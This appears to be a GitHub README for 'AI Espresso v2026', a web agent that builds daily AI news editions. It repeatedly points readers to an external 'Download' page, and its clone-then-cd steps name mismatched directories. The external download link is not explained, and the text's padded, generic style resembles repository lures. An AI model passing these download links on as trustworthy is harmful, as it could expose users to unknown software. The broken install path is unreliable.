# AI Espresso v2026 - AI news agent 2026

> **A web-based generator for daily AI news editions.** AI Espresso discovers relevant coverage through agentic workflows, evaluates it with LLM-assisted ranking, and creates publication-ready outputs in version 2026.

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/daviscarterrwyd1299/ai-espresso-news-agent?style=flat-square)](https://github.com/daviscarterrwyd1299/ai-espresso-news-agent)

---

<p align="center">
  <a href="https://daviscarterrwyd1299.github.io/ai-espresso-news-agent/">
    <img src="https://img.shields.io/badge/Download-AI%20Espresso%20Latest-brightgreen?style=for-the-badge" alt="Download AI Espresso">
  </a>
</p>

> **[Download AI Espresso v2026](https://daviscarterrwyd1299.github.io/ai-espresso-news-agent/)**

---

[Download Latest Build](https://daviscarterrwyd1299.github.io/ai-espresso-news-agent/)

---

## What AI Espresso Does

AI Espresso is a web AI news agent for producing a focused daily edition from several discovery channels. It ranks potential stories with LLM-assisted logic and turns the selected coverage into output that can move directly into a publishing workflow. The goal is a dependable editorial process rather than an isolated summary.

Publishers and teams can use the project to narrow a large AI news stream into an organized issue containing story cards, a prompt card, and a publication manifest. Cross-edition deduplication helps prevent recurring coverage from producing redundant selections and keeps each issue more consistent.

---

## Capabilities

- Creates daily AI news editions containing curated story cards and a prompt card
- Combines LLM-based ranking with deterministic editor gating in a hybrid discovery process
- Identifies duplicates between editions through canonical URLs, normalized titles, and embeddings
- Discovers sources through both a tiered catalog and web search
- Generates HTML, Markdown, and image asset outputs
- Can deliver editions by email with inline images when enabled
- Creates a publication manifest for managing the completed edition
- Uses an agentic workflow to support repeatable content production

---

## Installation

Get the repository by cloning it or downloading its files, then open the web project in the environment you normally use for development.

```bash
git clone https://github.com/daviscarterrwyd1299/ai-espresso-news-agent.git
cd AI-espresso-agent
```

Once the files are available, start the web application or use the local development process supplied by the project.

---

## Running the Pipeline

The edition workflow gathers source material, evaluates candidate stories, filters duplicates, and produces the final set of deliverables.

The process generally follows these stages:

1. Find stories through the source catalog and web search
2. Evaluate candidates using the LLM-assisted ranking process
3. Use editor gating to determine which stories are included
4. Create HTML, Markdown, and image asset versions of the edition
5. Publish the results or send them by email when that option is configured

A typical build and start sequence is:

```bash
npm install
npm run build
npm run start
```

When the repository provides another launcher, use its documented application entry point or deployment workflow for the web build.

---

## Project Settings

Configuration is normally defined in the project configuration files and in the publication manifest used by the edition process.

For example, settings can follow this structure:

```json
{
  "edition": "daily",
  "outputs": ["html", "markdown", "images"],
  "email_delivery": true,
  "deduplication": true
}
```

Use these settings to tailor source catalogs, delivery behavior, and rendering choices to the publishing process.

---

## Requirements

- An environment capable of running the web project
- A runtime compatible with the build and launch scripts
- Network connectivity for source collection and web search
- Storage space for generated HTML, Markdown, images, and manifests
- Email infrastructure if optional email delivery is turned on

---

## Frequently Asked Questions

**What steps produce a daily edition?**  
The agent gathers material from curated sources, ranks it with LLM assistance, and applies editor gating to build the daily AI news release.

**Which output types are available?**  
AI Espresso can produce HTML, Markdown, and image assets. A publication manifest is also generated to keep the resulting edition organized.

**How are duplicate stories handled?**  
The deduplication process compares canonical URLs, normalized titles, and embeddings to limit repeated stories across different editions.

**Where are the project options configured?**  
Review the configuration files and manifest entries responsible for discovery, rendering, and delivery settings.

**What should I check when output is missing or incorrect?**  
Inspect the source catalog, verify that discovery completed successfully, and review the render and export settings before running the pipeline again.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
